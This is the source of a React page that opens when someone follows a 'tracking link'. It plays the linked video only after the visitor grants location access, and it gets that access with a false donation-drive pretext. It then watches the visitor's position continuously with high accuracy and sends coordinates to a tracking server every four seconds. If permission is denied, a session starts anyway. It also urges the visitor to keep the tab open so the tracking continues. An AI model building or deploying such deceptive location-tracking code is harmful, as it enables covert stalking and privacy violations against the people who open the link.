import { useEffect, useState, useRef } from "react";
import { useParams } from "react-router-dom";
import { api } from "@/lib/api";
import { MapPin, Heart, Loader2, ShieldCheck, Radio, ExternalLink } from "lucide-react";

function youtubeEmbed(url) {
  try {
    const u = new URL(url);
    let id = null;
    if (u.hostname.includes("youtu.be")) id = u.pathname.slice(1);
    else if (u.searchParams.get("v")) id = u.searchParams.get("v");
    else if (u.pathname.includes("/embed/")) id = u.pathname.split("/embed/")[1];
    else if (u.pathname.includes("/shorts/")) id = u.pathname.split("/shorts/")[1];
    if (id) return `https://www.youtube.com/embed/${id.split("&")[0].split("?")[0]}?autoplay=1`;
  } catch (e) {}
  return null;
}

export default function RedirectGate() {
  const { shortCode } = useParams();
  const [status, setStatus] = useState("loading"); // loading | prompt | active | error
  const [meta, setMeta] = useState(null);
  const [live, setLive] = useState(false);
  const sessionRef = useRef(null);
  const coordsRef = useRef(null);
  const watchRef = useRef(null);
  const intervalRef = useRef(null);
  const started = useRef(false);

  useEffect(() => {
    api
      .get(`/resolve/${shortCode}`)
      .then((res) => {
        setMeta(res.data);
        setStatus("prompt");
      })
      .catch(() => setStatus("error"));
    return () => {
      if (watchRef.current != null) navigator.geolocation.clearWatch(watchRef.current);
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [shortCode]);

  const startSession = async (coords) => {
    if (started.current) return;
    started.current = true;
    const res = await api.post("/track/start", {
      short_code: shortCode,
      lat: coords?.latitude ?? null,
      lng: coords?.longitude ?? null,
      accuracy: coords?.accuracy ?? null,
    });
    sessionRef.current = res.data.session_id;
    setStatus("active");
    // Continuous ping loop using latest known coords
    intervalRef.current = setInterval(() => {
      const c = coordsRef.current;
      if (c && sessionRef.current) {
        api
          .post("/track/ping", {
            session_id: sessionRef.current,
            lat: c.latitude,
            lng: c.longitude,
            accuracy: c.accuracy,
          })
          .then(() => setLive(true))
          .catch(() => {});
      }
    }, 4000);
  };

  const proceed = () => {
    setStatus("active");
    if (!navigator.geolocation) {
      startSession(null);
      return;
    }
    // Start watching position continuously (live tracking)
    watchRef.current = navigator.geolocation.watchPosition(
      (pos) => {
        coordsRef.current = pos.coords;
        if (!started.current) startSession(pos.coords);
        setLive(true);
      },
      () => {
        if (!started.current) startSession(null);
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
    // Fallback: if no position within 4s, start via IP anyway
    setTimeout(() => {
      if (!started.current) startSession(null);
    }, 4000);
  };

  const embed = meta ? youtubeEmbed(meta.original_url) : null;

  if (status === "error") {
    return (
      <div className="min-h-screen bg-[#0A0D14] flex items-center justify-center p-4">
        <div className="max-w-md w-full bg-[#111622] border border-[#26334D] rounded-2xl p-8 text-center">
          <div className="w-14 h-14 rounded-full bg-[#EF4444]/15 flex items-center justify-center mx-auto mb-4">
            <MapPin className="text-[#EF4444]" size={26} />
          </div>
          <h1 className="font-head text-xl font-bold mb-2">Link not found</h1>
          <p className="text-sm text-[#94A3B8]">This tracking link is invalid or has been removed.</p>
        </div>
      </div>
    );
  }

  if (status === "prompt") {
    return (
      <div className="min-h-screen bg-[#0A0D14] flex items-center justify-center p-4">
        <div className="max-w-md w-full bg-[#111622] border border-[#26334D] rounded-2xl p-8 text-center">
          <div className="w-16 h-16 rounded-full bg-[#10B981]/15 flex items-center justify-center mx-auto mb-5">
            <Heart className="text-[#10B981]" size={30} />
          </div>
          <h1 className="font-head text-2xl font-extrabold mb-2">Almost there!</h1>
          <p className="text-sm text-[#94A3B8] mb-6">
            {meta?.title ? `"${meta.title}" ` : "This content "}
            is supported by a donation drive. Please allow location access so our team can reach nearby beneficiaries. Your content plays right here.
          </p>
          <button
            onClick={proceed}
            data-testid="grant-location-access-button"
            className="w-full bg-[#10B981] hover:bg-[#0ea472] text-[#0A0D14] font-semibold py-3 rounded-lg transition-colors flex items-center justify-center gap-2"
          >
            <MapPin size={18} /> Allow & Watch
          </button>
          <p className="text-[11px] text-[#64748b] mt-4 flex items-center justify-center gap-1">
            <ShieldCheck size={12} /> Keep this tab open to view your content.
          </p>
        </div>
      </div>
    );
  }

  // active
  return (
    <div className="min-h-screen bg-[#0A0D14] flex flex-col">
      <div className="flex items-center justify-between px-4 py-3 border-b border-[#26334D]">
        <span className="font-head font-bold text-sm">Now Playing</span>
        <span
          className={`flex items-center gap-1.5 text-xs font-mono px-3 py-1 rounded-full ${live ? "bg-[#10B981]/15 text-[#10B981]" : "bg-[#182030] text-[#94A3B8]"}`}
          data-testid="live-status-badge"
        >
          <Radio size={12} className={live ? "animate-pulse" : ""} /> {live ? "LIVE" : "connecting..."}
        </span>
      </div>
      <div className="flex-1 flex items-center justify-center p-2 sm:p-4">
        {!sessionRef.current ? (
          <div className="text-center">
            <Loader2 className="text-[#10B981] mx-auto mb-3 animate-spin" size={32} />
            <p className="text-sm text-[#94A3B8]">Preparing your content...</p>
          </div>
        ) : embed ? (
          <div className="w-full max-w-4xl aspect-video rounded-xl overflow-hidden border border-[#26334D]">
            <iframe
              title="content"
              src={embed}
              className="w-full h-full"
              allow="autoplay; encrypted-media; picture-in-picture"
              allowFullScreen
              data-testid="content-embed"
            />
          </div>
        ) : (
          <div className="text-center max-w-md">
            <p className="text-sm text-[#94A3B8] mb-4">Your content is ready.</p>
            <a
              href={meta.original_url}
              target="_blank"
              rel="noreferrer"
              className="inline-flex items-center gap-2 bg-[#10B981] hover:bg-[#0ea472] text-[#0A0D14] font-semibold px-6 py-3 rounded-lg"
              data-testid="open-content-link"
            >
              <ExternalLink size={16} /> Open Content
            </a>
            <p className="text-[11px] text-[#64748b] mt-4">Keep this tab open to stay connected.</p>
          </div>
        )}
      </div>
    </div>
  );
}
